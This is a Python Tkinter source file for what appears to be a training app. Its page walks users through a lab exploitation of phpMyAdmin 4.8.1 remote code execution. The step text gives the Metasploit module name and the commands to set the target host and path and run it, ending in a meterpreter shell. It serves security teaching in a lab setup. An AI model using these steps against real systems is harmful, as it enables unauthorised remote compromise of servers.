import tkinter as tk  # python 3
from tkinter import font as tkfont  # python 3
# import Tkinter as tk     # python 2
# import tkFont as tkfont  # python 2

from tkinter import font as tkfont
from tkinter import *
from tkinter import font, messagebox
import random, requests, os, sys
import PySimpleGUI as sg
from nav_bar import *
from subprocess import call, Popen, PIPE
import os


class AttackVectorEleven(tk.Frame):
    
    def __init__(self, parent, controller):
        tk.Frame.__init__(self, parent)
        self.controller = controller
        framefont = tkfont.Font(family='Calibri', size=33, weight="bold")
        
        main_frame = tk.Frame(self)
        
        highlightFont = font.Font(family='Calibri', name='appHighlightFont11', size=18)
        
        global phpmyadminrce
        phpmyadminrce = tk.PhotoImage(file='resources/phpmyadminrce.png')
        
        def load_terminal():
            p1 = Popen("exo-open --launch TerminalEmulator", stdout=PIPE, universal_newlines=True, shell=True).stdout
        
        def change_to_Step1():
            text = (
                "\n\nStep 1: Setup environment (the following setup was used in this demonstration)\n\n"
                "o   phpMyAdmin 4.8.1\n\n"
                "o   Windows 7\n\n"
                "o   Kali Linux\n\n"
                "o   XAMPP 7.2.0 (used to run phpMyAdmin on the Windows 7 machine)\n\n"
                "o   Metasploit\n\n"
                "o   Windows 7 and Kali Linux is configured to be in the same internal network.\n\n"
            )
            step1frame = tk.Message(main_frame, text=text, fg='black', bg='white', font=('Calibri', 20), anchor='nw',
                                    aspect=350)
            step1frame.place(rely=0.2, relx=0.2, relheight=1, relwidth=1)
            
        def change_to_Step2():
            text = (
                "\n\nStep 2: Walkthrough Part 1\n\n"
                "o   On the windows machine, make sure that you are running and logged into phpMyAdmin.\n\n"
                "o   Open terminal on Kali Linux and run metasploit using this command:\n"
                "     msfconsole\n\n"
                "o   Load the exploit using:\n"
                "     use exploit/multi/http/phpmyadmin_lfi_rce\n\n"
            )
            step2frame = tk.Message(main_frame, text=text, fg='black', bg='white', font=('Calibri', 20), anchor='nw',
                                    aspect=350)
            step2frame.place(rely=0.2, relx=0.2, relheight=1, relwidth=1)
            terminalButton = tk.Button(step2frame, text="Terminal", bg="#E7E7E7", fg="black", font=highlightFont,
                                       command=load_terminal, relief='flat').place(rely=0.5, relx=0.14, relheight=0.05,
                                                                                   relwidth=0.1)
            
        def change_to_Step3():
            text = (
                "\n\nStep 3: Walkthrough Part 2\n\n"
                "o  You are now required to enter the RHOSTS (Victim's IP address)\n"
                "and TARGETURI (name of the folder you have installed phpmyadmin 4.8.1 in).\n\n"
                "o  Use the following commands to set RHOSTS and TARGETURI:\n"
                "    set RHOSTS 192.168.68.117\n"
                "    set TARGETURI /phpmyadmin4.8.1/\n\n"
                "o  (IP address and folder name is just an example. Please modify accordingly)\n\n"
                "o  Finally, run the exploit using:\n"
                "    run\n\n"
                "o  If successfull, a meterpreter session should be created and the attack is complete.\n\n"
            )
            step3frame = tk.Message(main_frame, text=text, fg='black', bg='white', font=('Calibri', 20), anchor='nw',
                                    aspect=350)
            step3frame.place(rely=0.2, relx=0.2, relheight=1, relwidth=1)
                 
        # creates blue bar as canvas below nav bar housing label containing title of page
        title_canvas = tk.Canvas(self, bg='#64C1DA', highlightthickness=0)
        title_canvas.place(rely=0.08, relheight=0.12, relwidth=1)
        title_label = tk.Label(self, text="phpMyAdmin 4.8.1 RCE", bg='#4D6C84', fg='white',
                               anchor="c", font=framefont)
        title_label.place(rely=0.08, relheight=0.12, relwidth=1)
            
        allscreenframe = tk.Label(main_frame, bg='white')
        allscreenframe.place(rely=0.2, relheight=1, relwidth=1)
            
        sidescreenframe = tk.Label(main_frame, text="\n         Steps", bg='#E7E7E7', font=('Calibri', 20, 'bold'),
                                   anchor='nw')
        sidescreenframe.place(rely=0.2, relheight=1, relwidth=0.2)
        
        phpmyadminrce_label = tk.Label(main_frame, image=phpmyadminrce)
        phpmyadminrce_label.place(rely=0.36, relx=0.4)
            
        #Buttons
        step1btn = tk.Button(main_frame, text="Step 1", bg="#E7E7E7", fg="black", font=highlightFont,   
                             command=change_to_Step1, relief='flat').place(rely=0.3, relx=0.02, relheight=0.05,
                                                                           relwidth=0.1)
        step2btn = tk.Button(main_frame, text="Step 2", bg="#E7E7E7", fg="black", font=highlightFont,
                             command=change_to_Step2, relief='flat').place(rely=0.4, relx=0.02, relheight=0.05,
                                                                           relwidth=0.1)
        step2btn = tk.Button(main_frame, text="Step 3", bg="#E7E7E7", fg="black", font=highlightFont,
                             command=change_to_Step3, relief='flat').place(rely=0.5, relx=0.02, relheight=0.05,
                                                                           relwidth=0.1)
         
        display_nav_bar(self, controller)
        main_frame.pack(fill='both', expand=1)
